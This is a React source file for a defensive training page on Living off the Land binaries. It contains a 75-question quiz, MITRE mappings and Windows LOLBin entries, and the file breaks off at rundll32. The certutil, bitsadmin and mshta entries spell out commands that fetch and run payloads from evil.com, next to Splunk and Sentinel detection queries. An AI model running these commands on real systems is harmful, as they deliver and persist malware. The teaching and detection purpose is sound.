import React, { useState } from "react";
import LearnPageLayout from "../components/LearnPageLayout";
import QuizSection, { QuizQuestion } from "../components/QuizSection";
import {
  Box,
  Container,
  Typography,
  Paper,
  Tabs,
  Tab,
  Chip,
  Button,
  Accordion,
  AccordionSummary,
  AccordionDetails,
  Grid,
  List,
  ListItem,
  ListItemIcon,
  ListItemText,
  Table,
  TableBody,
  TableCell,
  TableContainer,
  TableHead,
  TableRow,
  IconButton,
  Tooltip,
  Alert,
  Divider,
  Card,
  CardContent,
  alpha,
} from "@mui/material";
import ArrowBackIcon from "@mui/icons-material/ArrowBack";
import ExpandMoreIcon from "@mui/icons-material/ExpandMore";
import ContentCopyIcon from "@mui/icons-material/ContentCopy";
import TerminalIcon from "@mui/icons-material/Terminal";
import SecurityIcon from "@mui/icons-material/Security";
import WarningIcon from "@mui/icons-material/Warning";
import CheckCircleIcon from "@mui/icons-material/CheckCircle";
import SearchIcon from "@mui/icons-material/Search";
import BuildIcon from "@mui/icons-material/Build";
import CodeIcon from "@mui/icons-material/Code";
import BugReportIcon from "@mui/icons-material/BugReport";
import SchoolIcon from "@mui/icons-material/School";
import VisibilityIcon from "@mui/icons-material/Visibility";
import ShieldIcon from "@mui/icons-material/Shield";
import StorageIcon from "@mui/icons-material/Storage";
import NetworkCheckIcon from "@mui/icons-material/NetworkCheck";
import QuizIcon from "@mui/icons-material/Quiz";
import { Link, useNavigate } from "react-router-dom";

interface TabPanelProps {
  children?: React.ReactNode;
  index: number;
  value: number;
}

function TabPanel(props: TabPanelProps) {
  const { children, value, index, ...other } = props;
  return (
    <div role="tabpanel" hidden={value !== index} {...other}>
      {value === index && <Box sx={{ py: 3 }}>{children}</Box>}
    </div>
  );
}

const CodeBlock: React.FC<{ code: string; language?: string }> = ({
  code,
  language = "bash",
}) => {
  const [copied, setCopied] = useState(false);

  const handleCopy = () => {
    navigator.clipboard.writeText(code);
    setCopied(true);
    setTimeout(() => setCopied(false), 2000);
  };

  return (
    <Paper
      sx={{
        p: 2,
        bgcolor: "#121424",
        borderRadius: 2,
        position: "relative",
        my: 2,
        border: "1px solid rgba(234, 88, 12, 0.3)",
      }}
    >
      <Box sx={{ position: "absolute", top: 8, right: 8, display: "flex", gap: 1 }}>
        <Chip label={language} size="small" sx={{ bgcolor: "#f97316", color: "#0b1020" }} />
        <Tooltip title={copied ? "Copied!" : "Copy"}>
          <IconButton size="small" onClick={handleCopy} sx={{ color: "#e2e8f0" }}>
            <ContentCopyIcon fontSize="small" />
          </IconButton>
        </Tooltip>
      </Box>
      <Box
        component="pre"
        sx={{
          m: 0,
          overflow: "auto",
          fontFamily: "monospace",
          fontSize: "0.85rem",
          color: "#e2e8f0",
          pt: 2,
        }}
      >
        {code}
      </Box>
    </Paper>
  );
};

const QUIZ_QUESTION_COUNT = 10;
const QUIZ_ACCENT_COLOR = "#f97316";

const quizQuestions: QuizQuestion[] = [
  {
    id: 1,
    topic: "Basics",
    question: "What does Living off the Land (LOTL) mean?",
    options: [
      "Using legitimate system tools and binaries to perform actions",
      "Installing custom malware for every task",
      "Only using cloud services for attacks",
      "Disabling all local logging before execution",
    ],
    correctAnswer: 0,
    explanation: "LOTL leverages built-in tools to reduce the need for custom binaries.",
  },
  {
    id: 2,
    topic: "Basics",
    question: "Why do attackers favor LOLBins and LOLBAS?",
    options: [
      "They are signed and often trusted by controls",
      "They always bypass MFA",
      "They only work on unpatched systems",
      "They remove the need for credentials",
    ],
    correctAnswer: 0,
    explanation: "Signed binaries and trusted tools can blend into normal activity.",
  },
  {
    id: 3,
    topic: "Basics",
    question: "LOLBAS primarily refers to:",
    options: [
      "Living Off The Land Binaries and Scripts on Windows",
      "A Linux-only exploitation toolkit",
      "A macOS package manager",
      "A cloud vulnerability scanner",
    ],
    correctAnswer: 0,
    explanation: "LOLBAS documents Windows binaries and scripts that can be abused.",
  },
  {
    id: 4,
    topic: "Basics",
    question: "GTFOBins is best described as:",
    options: [
      "A catalog of Unix binaries that can be abused for escalation or file access",
      "A Windows-only logging tool",
      "A malware packer",
      "A password manager",
    ],
    correctAnswer: 0,
    explanation: "GTFOBins lists Unix binaries with exploitable features.",
  },
  {
    id: 5,
    topic: "Basics",
    question: "What is proxy execution in LOTL context?",
    options: [
      "Using a trusted binary to execute a payload indirectly",
      "Routing traffic through a VPN",
      "Using a browser extension to run code",
      "Spawning a new service for each command",
    ],
    correctAnswer: 0,
    explanation: "Proxy execution uses trusted binaries as wrappers to run code.",
  },
  {
    id: 6,
    topic: "Windows LOLBins",
    question: "Which Windows utility is commonly abused to download files?",
    options: [
      "certutil",
      "diskpart",
      "notepad",
      "calc",
    ],
    correctAnswer: 0,
    explanation: "certutil can download and decode files.",
  },
  {
    id: 7,
    topic: "Windows LOLBins",
    question: "Which tool can schedule tasks for later execution?",
    options: [
      "schtasks",
      "ping",
      "whoami",
      "tasklist",
    ],
    correctAnswer: 0,
    explanation: "schtasks creates or runs scheduled tasks.",
  },
  {
    id: 8,
    topic: "Windows LOLBins",
    question: "Which tool is often used to execute HTML applications (HTA)?",
    options: [
      "mshta",
      "regedit",
      "netstat",
      "ipconfig",
    ],
    correctAnswer: 0,
    explanation: "mshta can execute HTA files and scripts.",
  },
  {
    id: 9,
    topic: "Windows LOLBins",
    question: "Which utility can run exported functions from DLLs?",
    options: [
      "rundll32",
      "powershell",
      "control",
      "wmic",
    ],
    correctAnswer: 0,
    explanation: "rundll32 can call DLL exports and is often abused.",
  },
  {
    id: 10,
    topic: "Windows LOLBins",
    question: "Which signed binary can be abused to register COM components or run scripts?",
    options: [
      "regsvr32",
      "gpupdate",
      "chkdsk",
      "dxdiag",
    ],
    correctAnswer: 0,
    explanation: "regsvr32 supports script-based COM registration.",
  },
  {
    id: 11,
    topic: "Windows LOLBins",
    question: "PowerShell is popular in LOTL because it:",
    options: [
      "Is a built-in scripting environment with rich system access",
      "Always runs without logging",
      "Disables antivirus by default",
      "Only supports local commands",
    ],
    correctAnswer: 0,
    explanation: "PowerShell provides powerful scripting and access to Windows APIs.",
  },
  {
    id: 12,
    topic: "Windows LOLBins",
    question: "Which utility can be abused for background downloads?",
    options: [
      "bitsadmin",
      "format",
      "attrib",
      "clip",
    ],
    correctAnswer: 0,
    explanation: "bitsadmin can transfer files via BITS jobs.",
  },
  {
    id: 13,
    topic: "Windows LOLBins",
    question: "Which tool can execute WMI-based process creation?",
    options: [
      "wmic",
      "taskkill",
      "arp",
      "hostname",
    ],
    correctAnswer: 0,
    explanation: "wmic can create processes remotely or locally.",
  },
  {
    id: 14,
    topic: "Windows LOLBins",
    question: "Which utility can be used to modify firewall rules?",
    options: [
      "netsh",
      "net use",
      "nslookup",
      "whoami",
    ],
    correctAnswer: 0,
    explanation: "netsh manages network configuration including firewall rules.",
  },
  {
    id: 15,
    topic: "Windows LOLBins",
    question: "Which tool can install MSI packages silently?",
    options: [
      "msiexec",
      "tasklist",
      "wevtutil",
      "tree",
    ],
    correctAnswer: 0,
    explanation: "msiexec installs MSI packages and can be abused for execution.",
  },
  {
    id: 16,
    topic: "Windows LOLBins",
    question: "Which scripting hosts execute VBScript or JScript files?",
    options: [
      "cscript and wscript",
      "netstat and route",
      "regedit and reg",
      "attrib and icacls",
    ],
    correctAnswer: 0,
    explanation: "cscript and wscript are Windows script hosts.",
  },
  {
    id: 17,
    topic: "Windows LOLBins",
    question: "Which utility can run commands for matching files in a directory?",
    options: [
      "forfiles",
      "findstr",
      "tasklist",
      "title",
    ],
    correctAnswer: 0,
    explanation: "forfiles can execute commands against file sets.",
  },
  {
    id: 18,
    topic: "Windows LOLBins",
    question: "certutil is also commonly abused to:",
    options: [
      "Decode Base64 or convert file formats",
      "Disable Windows Defender",
      "Create domain users",
      "Patch the kernel",
    ],
    correctAnswer: 0,
    explanation: "certutil can encode or decode files for staging.",
  },
  {
    id: 19,
    topic: "Linux LOTL",
    question: "Which Linux tool is commonly used for file downloads?",
    options: [
      "curl or wget",
      "chmod",
      "ps",
      "who",
    ],
    correctAnswer: 0,
    explanation: "curl and wget retrieve remote content over HTTP or HTTPS.",
  },
  {
    id: 20,
    topic: "Linux LOTL",
    question: "Which command can execute other commands via `-exec`?",
    options: [
      "find",
      "df",
      "uptime",
      "pwd",
    ],
    correctAnswer: 0,
    explanation: "find supports `-exec` to run commands on matches.",
  },
  {
    id: 21,
    topic: "Linux LOTL",
    question: "Which binary is documented in GTFOBins for shell access?",
    options: [
      "tar",
      "ls",
      "cat",
      "head",
    ],
    correctAnswer: 0,
    explanation: "tar has options that can be abused to execute commands.",
  },
  {
    id: 22,
    topic: "Linux LOTL",
    question: "Why are scripting languages like Python or Perl useful in LOTL?",
    options: [
      "They are often preinstalled and can execute complex logic",
      "They always disable logging",
      "They require no permissions to access root files",
      "They only run on Windows",
    ],
    correctAnswer: 0,
    explanation: "Preinstalled scripting languages provide flexible execution paths.",
  },
  {
    id: 23,
    topic: "Linux LOTL",
    question: "Why is `bash -c` commonly seen in LOTL activity?",
    options: [
      "It executes an arbitrary command string",
      "It disables all audit logs",
      "It encrypts network traffic",
      "It removes user accounts",
    ],
    correctAnswer: 0,
    explanation: "`bash -c` executes a provided command string.",
  },
  {
    id: 24,
    topic: "Linux LOTL",
    question: "Which tool is often used for port forwarding or relays?",
    options: [
      "socat",
      "sed",
      "grep",
      "cut",
    ],
    correctAnswer: 0,
    explanation: "socat can relay traffic and create tunnels.",
  },
  {
    id: 25,
    topic: "Linux LOTL",
    question: "Why is `curl | sh` risky?",
    options: [
      "It executes remote content without validation",
      "It forces a reboot",
      "It disables SSH",
      "It always fails on Linux",
    ],
    correctAnswer: 0,
    explanation: "Piping remote content into a shell can execute untrusted code.",
  },
  {
    id: 26,
    topic: "macOS",
    question: "Which macOS tool executes AppleScript?",
    options: [
      "osascript",
      "diskutil",
      "launchctl",
      "defaults",
    ],
    correctAnswer: 0,
    explanation: "osascript runs AppleScript and JavaScript for Automation.",
  },
  {
    id: 27,
    topic: "macOS",
    question: "Which macOS tool manages launch agents and daemons?",
    options: [
      "launchctl",
      "xattr",
      "ditto",
      "spctl",
    ],
    correctAnswer: 0,
    explanation: "launchctl loads and manages LaunchAgents and LaunchDaemons.",
  },
  {
    id: 28,
    topic: "macOS",
    question: "The `defaults` command is used to:",
    options: [
      "Read and write macOS preference files",
      "Encrypt disks with FileVault",
      "Create new user accounts",
      "Disable SIP",
    ],
    correctAnswer: 0,
    explanation: "defaults reads and modifies preference settings.",
  },
  {
    id: 29,
    topic: "macOS",
    question: "What is `plutil` primarily used for?",
    options: [
      "Viewing or converting plist files",
      "Managing firewall rules",
      "Updating system packages",
      "Signing binaries",
    ],
    correctAnswer: 0,
    explanation: "plutil inspects and converts plist formats.",
  },
  {
    id: 30,
    topic: "macOS",
    question: "The `security` command can:",
    options: [
      "Interact with keychains and certificates",
      "Disable Gatekeeper permanently",
      "Replace kernel extensions",
      "Clear system logs",
    ],
    correctAnswer: 0,
    explanation: "security manages keychains and cryptographic items.",
  },
  {
    id: 31,
    topic: "Detection",
    question: "Why is command-line logging important for LOTL detection?",
    options: [
      "It captures suspicious arguments and encoded commands",
      "It disables PowerShell",
      "It prevents file writes",
      "It replaces antivirus",
    ],
    correctAnswer: 0,
    explanation: "Command-line logs reveal intent and unusual parameters.",
  },
  {
    id: 32,
    topic: "Detection",
    question: "Which Windows event ID captures process creation?",
    options: [
      "4688",
      "4624",
      "4768",
      "1102",
    ],
    correctAnswer: 0,
    explanation: "Event 4688 records new process creation in Security logs.",
  },
  {
    id: 33,
    topic: "Detection",
    question: "Which Sysmon event commonly logs process creation?",
    options: [
      "Event ID 1",
      "Event ID 3",
      "Event ID 11",
      "Event ID 22",
    ],
    correctAnswer: 0,
    explanation: "Sysmon 1 records process creation with command lines.",
  },
  {
    id: 34,
    topic: "Detection",
    question: "PowerShell Script Block Logging corresponds to:",
    options: [
      "Event ID 4104",
      "Event ID 4625",
      "Event ID 7045",
      "Event ID 4769",
    ],
    correctAnswer: 0,
    explanation: "Event 4104 records PowerShell script block content.",
  },
  {
    id: 35,
    topic: "Detection",
    question: "What is a common LOTL detection signal?",
    options: [
      "Office spawning PowerShell with encoded arguments",
      "Regular Windows updates",
      "User logins during business hours",
      "System restore points",
    ],
    correctAnswer: 0,
    explanation: "Unusual parent-child chains with encoded commands are suspicious.",
  },
  {
    id: 36,
    topic: "Detection",
    question: "Why monitor for unusual outbound traffic from LOLBins?",
    options: [
      "Many LOLBins are not expected to make network calls",
      "LOLBins always use DNS tunnels",
      "LOLBins only run offline",
      "LOLBins never touch the network",
    ],
    correctAnswer: 0,
    explanation: "Network activity from unexpected binaries can indicate abuse.",
  },
  {
    id: 37,
    topic: "Hardening",
    question: "What is a strong control against LOLBin abuse?",
    options: [
      "Application allowlisting with AppLocker or WDAC",
      "Disabling all logging",
      "Allowing unsigned scripts by default",
      "Removing antivirus",
    ],
    correctAnswer: 0,
    explanation: "Allowlisting restricts what binaries can run.",
  },
  {
    id: 38,
    topic: "Hardening",
    question: "Constrained Language Mode helps by:",
    options: [
      "Limiting PowerShell capabilities for untrusted scripts",
      "Disabling all PowerShell usage",
      "Forcing encrypted DNS",
      "Allowing unsigned drivers",
    ],
    correctAnswer: 0,
    explanation: "Constrained Language Mode restricts advanced PowerShell features.",
  },
  {
    id: 39,
    topic: "Hardening",
    question: "AMSI provides:",
    options: [
      "Content inspection for scripts at runtime",
      "Automatic patching of the OS",
      "A password manager for admins",
      "A kernel debugger",
    ],
    correctAnswer: 0,
    explanation: "AMSI allows security tools to scan script content.",
  },
  {
    id: 40,
    topic: "Hardening",
    question: "Why restrict macros and Office child processes?",
    options: [
      "Office is a common entry point for LOTL execution chains",
      "Office never spawns other processes",
      "Office updates are required for security",
      "Office does not support scripting",
    ],
    correctAnswer: 0,
    explanation: "Office macro abuse often launches LOLBins.",
  },
  {
    id: 41,
    topic: "Hardening",
    question: "What is the goal of egress filtering?",
    options: [
      "Limit outbound traffic paths for suspicious tools",
      "Block all inbound network connections",
      "Disable local logging",
      "Increase download speeds",
    ],
    correctAnswer: 0,
    explanation: "Egress controls reduce the ability of tools to reach the internet.",
  },
  {
    id: 42,
    topic: "Hardening",
    question: "Why is regular tool inventory valuable?",
    options: [
      "It identifies risky binaries and scripts to monitor",
      "It disables system updates",
      "It removes the need for alerting",
      "It guarantees no misuse",
    ],
    correctAnswer: 0,
    explanation: "Inventorying tools helps prioritize monitoring and controls.",
  },
  {
    id: 43,
    topic: "Telemetry",
    question: "Which log source helps identify PowerShell abuse?",
    options: [
      "Windows PowerShell logs and Script Block Logging",
      "Printer service logs only",
      "DHCP server logs only",
      "BIOS event logs",
    ],
    correctAnswer: 0,
    explanation: "PowerShell logs capture script activity and encoded commands.",
  },
  {
    id: 44,
    topic: "Telemetry",
    question: "Why is parent-child process analysis useful?",
    options: [
      "It highlights unusual execution chains",
      "It replaces network monitoring",
      "It disables malware",
      "It prevents file writes",
    ],
    correctAnswer: 0,
    explanation: "Unexpected parent-child chains are common LOTL indicators.",
  },
  {
    id: 45,
    topic: "Telemetry",
    question: "What does Sysmon Event ID 3 record?",
    options: [
      "Network connections",
      "Process creation",
      "Registry changes",
      "File deletions",
    ],
    correctAnswer: 0,
    explanation: "Sysmon 3 captures network connections.",
  },
  {
    id: 46,
    topic: "Telemetry",
    question: "A base64 encoded PowerShell command often indicates:",
    options: [
      "Obfuscation to evade detection",
      "Standard system maintenance",
      "User account creation",
      "Registry backup activity",
    ],
    correctAnswer: 0,
    explanation: "Encoded commands commonly hide malicious intent.",
  },
  {
    id: 47,
    topic: "MITRE",
    question: "Signed Binary Proxy Execution maps to which MITRE technique?",
    options: [
      "T1218",
      "T1078",
      "T1041",
      "T1567",
    ],
    correctAnswer: 0,
    explanation: "T1218 covers signed binary proxy execution.",
  },
  {
    id: 48,
    topic: "MITRE",
    question: "PowerShell abuse commonly maps to:",
    options: [
      "T1059.001 (Command and Scripting Interpreter: PowerShell)",
      "T1555.003 (Credentials from Web Browsers)",
      "T1207 (Rogue Domain Controller)",
      "T1490 (Inhibit System Recovery)",
    ],
    correctAnswer: 0,
    explanation: "PowerShell is covered under T1059.001.",
  },
  {
    id: 49,
    topic: "Windows LOLBins",
    question: "Why are signed binaries attractive to attackers?",
    options: [
      "They are often trusted by application allowlists",
      "They are guaranteed to evade all detection",
      "They provide root access by default",
      "They bypass authentication automatically",
    ],
    correctAnswer: 0,
    explanation: "Signed binaries may be trusted by controls and users.",
  },
  {
    id: 50,
    topic: "Windows LOLBins",
    question: "What is the primary risk of `rundll32` abuse?",
    options: [
      "It can execute code via DLL exports without dropping new binaries",
      "It disables Defender services permanently",
      "It encrypts disks by default",
      "It reboots the system after execution",
    ],
    correctAnswer: 0,
    explanation: "rundll32 can execute DLL exports with minimal artifacts.",
  },
  {
    id: 51,
    topic: "Windows LOLBins",
    question: "Why is `regsvr32` notable for defense teams?",
    options: [
      "It can execute scripts in a signed binary context",
      "It is only used by malware",
      "It requires kernel permissions to run",
      "It is deprecated on all Windows versions",
    ],
    correctAnswer: 0,
    explanation: "regsvr32 supports script-based COM registration paths.",
  },
  {
    id: 52,
    topic: "Windows LOLBins",
    question: "Which tool is often seen with `-EncodedCommand`?",
    options: [
      "powershell",
      "tasklist",
      "net use",
      "route",
    ],
    correctAnswer: 0,
    explanation: "PowerShell supports encoded command arguments.",
  },
  {
    id: 53,
    topic: "Windows LOLBins",
    question: "Which utility is commonly used for WMI query and execution?",
    options: [
      "wmic",
      "route",
      "tracert",
      "fsutil",
    ],
    correctAnswer: 0,
    explanation: "wmic performs WMI queries and can launch processes.",
  },
  {
    id: 54,
    topic: "Linux LOTL",
    question: "Which tool can create encrypted tunnels or TLS connections?",
    options: [
      "openssl",
      "tail",
      "cut",
      "uniq",
    ],
    correctAnswer: 0,
    explanation: "openssl can establish TLS connections and proxies.",
  },
  {
    id: 55,
    topic: "Linux LOTL",
    question: "Why are `awk` and `sed` sometimes involved in LOTL?",
    options: [
      "They can transform data and create scripts on the fly",
      "They disable system logging automatically",
      "They only work on Windows",
      "They are used for password hashing only",
    ],
    correctAnswer: 0,
    explanation: "Text processing tools can reformat or generate commands.",
  },
  {
    id: 56,
    topic: "Linux LOTL",
    question: "What is the main defensive concern with `python -c`?",
    options: [
      "Inline code execution with minimal artifacts",
      "Automatic privilege escalation",
      "Hardware encryption bypass",
      "Kernel patching",
    ],
    correctAnswer: 0,
    explanation: "Inline execution allows quick logic without writing files.",
  },
  {
    id: 57,
    topic: "Linux LOTL",
    question: "Which tool can open a reverse shell or listener in GTFOBins?",
    options: [
      "nmap",
      "ps",
      "du",
      "chown",
    ],
    correctAnswer: 0,
    explanation: "nmap has scripting and interactive modes that can be abused.",
  },
  {
    id: 58,
    topic: "Detection",
    question: "Why is AMSI bypassing a concern for defenders?",
    options: [
      "It weakens script inspection for malicious content",
      "It improves log quality",
      "It forces MFA enrollment",
      "It disables PowerShell entirely",
    ],
    correctAnswer: 0,
    explanation: "AMSI bypasses reduce visibility into malicious script content.",
  },
  {
    id: 59,
    topic: "Detection",
    question: "A sudden spike in `regsvr32` or `mshta` usage could indicate:",
    options: [
      "Potential LOTL abuse",
      "Normal Windows updates",
      "User profile cleanup",
      "Printer configuration changes",
    ],
    correctAnswer: 0,
    explanation: "Unusual usage of these binaries is suspicious.",
  },
  {
    id: 60,
    topic: "Hardening",
    question: "Why is removing legacy tools helpful?",
    options: [
      "It reduces the number of abuseable binaries",
      "It increases system uptime",
      "It ensures all users are admins",
      "It disables network security controls",
    ],
    correctAnswer: 0,
    explanation: "Fewer tools reduce available execution vectors.",
  },
  {
    id: 61,
    topic: "Hardening",
    question: "Why should admin tools be restricted to admin workstations?",
    options: [
      "To prevent broad abuse across the enterprise",
      "To make patching harder",
      "To disable logging",
      "To avoid using MFA",
    ],
    correctAnswer: 0,
    explanation: "Limiting admin tooling reduces exposure on user endpoints.",
  },
  {
    id: 62,
    topic: "Hardening",
    question: "Which is a safe defensive practice for LOTL?",
    options: [
      "Baseline normal process usage and alert on deviations",
      "Disable all security logs",
      "Allow unsigned scripts by default",
      "Ignore command-line arguments",
    ],
    correctAnswer: 0,
    explanation: "Baselining helps detect unusual tool usage.",
  },
  {
    id: 63,
    topic: "Telemetry",
    question: "Why monitor for suspicious child processes of browsers?",
    options: [
      "Browsers rarely spawn admin tools in normal usage",
      "Browsers never spawn any processes",
      "Browser logs include password hashes",
      "Browsers require kernel access",
    ],
    correctAnswer: 0,
    explanation: "Browser-spawned admin tools often indicate malicious activity.",
  },
  {
    id: 64,
    topic: "Telemetry",
    question: "What is one common indicator for `certutil` misuse?",
    options: [
      "Network downloads followed by Base64 decode commands",
      "Only local file reads",
      "Usage limited to certificate stores",
      "No command-line arguments",
    ],
    correctAnswer: 0,
    explanation: "Download and decode combinations often indicate staging.",
  },
  {
    id: 65,
    topic: "Telemetry",
    question: "Why track process hash and signer information?",
    options: [
      "To confirm whether a binary is legitimate and unmodified",
      "To replace endpoint detection tools",
      "To disable Windows updates",
      "To automatically grant admin rights",
    ],
    correctAnswer: 0,
    explanation: "Signer and hash data help verify trusted binaries.",
  },
  {
    id: 66,
    topic: "Telemetry",
    question: "What does a high volume of `powershell.exe` execution suggest?",
    options: [
      "Potential automation or abuse that deserves review",
      "Guaranteed malware infection",
      "A required OS update",
      "A completed backup",
    ],
    correctAnswer: 0,
    explanation: "High usage may be legitimate or suspicious; it should be reviewed.",
  },
  {
    id: 67,
    topic: "MITRE",
    question: "Command and Scripting Interpreter maps to which MITRE technique?",
    options: [
      "T1059",
      "T1071",
      "T1041",
      "T1090",
    ],
    correctAnswer: 0,
    explanation: "T1059 covers command and scripting interpreter usage.",
  },
  {
    id: 68,
    topic: "MITRE",
    question: "LOLBAS activity often overlaps with which tactic?",
    options: [
      "Defense Evasion",
      "Impact",
      "Resource Development",
      "Reconnaissance",
    ],
    correctAnswer: 0,
    explanation: "LOTL techniques often aim to evade defenses.",
  },
  {
    id: 69,
    topic: "Basics",
    question: "LOTL activity is not always fileless because:",
    options: [
      "It can still write scripts or staged payloads to disk",
      "It only runs in memory by definition",
      "It requires kernel drivers",
      "It deletes all files automatically",
    ],
    correctAnswer: 0,
    explanation: "LOTL can be fileless but may also drop staged artifacts.",
  },
  {
    id: 70,
    topic: "Basics",
    question: "What is the main defensive value of the LOLBAS project?",
    options: [
      "It catalogs abuseable binaries for monitoring and hardening",
      "It provides malware samples",
      "It is a paid EDR product",
      "It replaces patch management",
    ],
    correctAnswer: 0,
    explanation: "LOLBAS helps defenders prioritize monitoring and controls.",
  },
  {
    id: 71,
    topic: "Windows LOLBins",
    question: "Why is `msiexec` sometimes monitored in SOCs?",
    options: [
      "It can install packages with minimal user prompts",
      "It is a network scanner",
      "It only runs in safe mode",
      "It disables Windows updates",
    ],
    correctAnswer: 0,
    explanation: "Silent installs can be abused for execution.",
  },
  {
    id: 72,
    topic: "Windows LOLBins",
    question: "Which behavior could indicate `regsvr32` abuse?",
    options: [
      "Fetching scripts from a remote URL",
      "Reading local certificate stores",
      "Enumerating local disks",
      "Listing printers",
    ],
    correctAnswer: 0,
    explanation: "Remote script loading is a known abuse pattern.",
  },
  {
    id: 73,
    topic: "Linux LOTL",
    question: "Why monitor for new outbound connections from `bash`?",
    options: [
      "Interactive shells usually do not open network connections",
      "bash is never used by admins",
      "bash cannot execute commands",
      "bash only runs on Windows",
    ],
    correctAnswer: 0,
    explanation: "Unexpected network activity from shells is suspicious.",
  },
  {
    id: 74,
    topic: "Detection",
    question: "Which is a good detection strategy for LOTL?",
    options: [
      "Combine process, command-line, and network telemetry",
      "Rely only on file hashes",
      "Disable script logging",
      "Ignore parent-child relationships",
    ],
    correctAnswer: 0,
    explanation: "Multiple signals improve detection accuracy.",
  },
  {
    id: 75,
    topic: "Basics",
    question: "The main risk of LOTL techniques is that they:",
    options: [
      "Blend with normal admin activity and are harder to spot",
      "Always crash systems",
      "Require physical access",
      "Only work on outdated systems",
    ],
    correctAnswer: 0,
    explanation: "LOTL uses trusted tools, which makes detection more difficult.",
  },
];

const LivingOffTheLandPage: React.FC = () => {
  const navigate = useNavigate();
  const [tabValue, setTabValue] = useState(0);

  const pageContext = `This page covers Living off the Land (LOTL) techniques including LOLBAS (Windows) and GTFOBins (Linux). Topics include understanding LOLBins, proxy execution, signed binary abuse, and detection strategies. Windows tools covered: certutil, bitsadmin, powershell, rundll32, regsvr32, mshta, wmic, schtasks, netsh, msiexec, cscript/wscript, forfiles, pcalua. Linux tools: bash/sh, sudo, python/perl, tar, find, curl/wget, awk/sed, vim/nano, nmap, socat, openssl. macOS tools: osascript, launchctl, plutil, defaults, security, curl. Includes MITRE ATT&CK mappings, SIEM detection queries (Splunk, Sentinel, Elastic), real-world attack chains, and hands-on labs. The page focuses on detection signals, hardening checklists, safe inventory commands, and defensive security.`;

  // MITRE ATT&CK Mappings for LOLBins
  const mitreMapping = [
    { technique: "T1218", name: "System Binary Proxy Execution", binaries: ["rundll32", "regsvr32", "mshta", "msiexec", "cmstp", "installutil"], tactic: "Defense Evasion" },
    { technique: "T1059.001", name: "PowerShell", binaries: ["powershell.exe", "pwsh.exe"], tactic: "Execution" },
    { technique: "T1059.003", name: "Windows Command Shell", binaries: ["cmd.exe"], tactic: "Execution" },
    { technique: "T1059.005", name: "Visual Basic", binaries: ["cscript.exe", "wscript.exe", "mshta.exe"], tactic: "Execution" },
    { technique: "T1053.005", name: "Scheduled Task", binaries: ["schtasks.exe", "at.exe"], tactic: "Persistence" },
    { technique: "T1197", name: "BITS Jobs", binaries: ["bitsadmin.exe"], tactic: "Defense Evasion" },
    { technique: "T1105", name: "Ingress Tool Transfer", binaries: ["certutil", "bitsadmin", "curl", "wget"], tactic: "Command and Control" },
    { technique: "T1047", name: "WMI", binaries: ["wmic.exe", "wmiprvse.exe"], tactic: "Execution" },
    { technique: "T1548.002", name: "Bypass UAC", binaries: ["fodhelper.exe", "computerdefaults.exe", "eventvwr.exe"], tactic: "Privilege Escalation" },
    { technique: "T1027.010", name: "Command Obfuscation", binaries: ["powershell", "cmd", "bash"], tactic: "Defense Evasion" },
  ];

  // Detailed Windows LOLBins with commands
  const windowsLOLBins = [
    {
      name: "certutil.exe",
      path: "C:\\Windows\\System32\\certutil.exe",
      legitimateUse: "Certificate management and verification",
      mitre: ["T1105", "T1140"],
      abuseMethods: [
        { method: "Download files", command: "certutil -urlcache -split -f http://evil.com/payload.exe payload.exe", risk: "Critical" },
        { method: "Base64 decode", command: "certutil -decode encoded.txt decoded.exe", risk: "High" },
        { method: "Hash calculation", command: "certutil -hashfile file.exe MD5", risk: "Low" },
        { method: "ADS write", command: "certutil -urlcache -split -f http://evil.com/payload file.txt:payload", risk: "Critical" },
      ],
      detection: "Monitor certutil with -urlcache, -decode, or -encode flags. Alert on network connections.",
      splunkQuery: `index=windows source="WinEventLog:Microsoft-Windows-Sysmon/Operational" EventCode=1 
| search Image="*certutil.exe*" 
| where match(CommandLine, "(?i)(urlcache|decode|encode)")
| table _time Computer User Image CommandLine ParentImage`,
      sentinelQuery: `DeviceProcessEvents
| where FileName =~ "certutil.exe"
| where ProcessCommandLine has_any ("urlcache", "decode", "encode")
| project Timestamp, DeviceName, AccountName, ProcessCommandLine, InitiatingProcessFileName`,
    },
    {
      name: "bitsadmin.exe",
      path: "C:\\Windows\\System32\\bitsadmin.exe",
      legitimateUse: "Background Intelligent Transfer Service management",
      mitre: ["T1197", "T1105"],
      abuseMethods: [
        { method: "Download files", command: "bitsadmin /transfer job /download /priority high http://evil.com/payload.exe C:\\temp\\payload.exe", risk: "Critical" },
        { method: "Create persistent job", command: "bitsadmin /create /download persistjob && bitsadmin /addfile persistjob http://evil.com/payload.exe C:\\temp\\payload.exe && bitsadmin /setnotifycmdline persistjob C:\\temp\\payload.exe NULL && bitsadmin /resume persistjob", risk: "Critical" },
        { method: "Execute on completion", command: "bitsadmin /setnotifycmdline job cmd.exe \"/c calc.exe\"", risk: "Critical" },
      ],
      detection: "Monitor bitsadmin with /transfer, /create, /addfile, or /setnotifycmdline. Check for jobs created outside IT context.",
      splunkQuery: `index=windows source="WinEventLog:Microsoft-Windows-Sysmon/Operational" EventCode=1 
| search Image="*bitsadmin.exe*" 
| where match(CommandLine, "(?i)(transfer|addfile|setnotifycmdline|create)")
| table _time Computer User Image CommandLine ParentImage`,
      sentinelQuery: `DeviceProcessEvents
| where FileName =~ "bitsadmin.exe"
| where ProcessCommandLine has_any ("transfer", "addfile", "setnotifycmdline")
| project Timestamp, DeviceName, AccountName, ProcessCommandLine`,
    },
    {
      name: "mshta.exe",
      path: "C:\\Windows\\System32\\mshta.exe",
      legitimateUse: "Execute Microsoft HTML Applications (.hta files)",
      mitre: ["T1218.005", "T1059.005"],
      abuseMethods: [
        { method: "Execute remote HTA", command: "mshta http://evil.com/payload.hta", risk: "Critical" },
        { method: "Inline VBScript", command: "mshta vbscript:Execute(\"CreateObject(\"\"Wscript.Shell\"\").Run \"\"calc.exe\"\", 0:close\")", risk: "Critical" },
        { method: "Inline JavaScript", command: "mshta javascript:a=(GetObject(\"script:http://evil.com/payload.sct\")).Exec();close();", risk: "Critical" },
      ],
      detection: "Monitor mshta.exe spawning child processes or making network connections. Alert on inline script execution.",
      splunkQuery: `index=windows source="WinEventLog:Microsoft-Windows-Sysmon/Operational" EventCode=1 
| search Image="*mshta.exe*" 
| where match(CommandLine, "(?i)(http|vbscript|javascript)")
| table _time Computer User Image CommandLine ParentImage`,
      sentinelQuery: `DeviceProcessEvents
| where FileName =~ "mshta.exe"
| where ProcessCommandLine has_any ("http://", "https://", "vbscript:", "javascript:")
| project Timestamp, DeviceName, AccountName, ProcessCommandLine`,
    },
    {
      name: "rundll32.exe",
      path: "C:\\Windows\\System32\\rundll32.exe",
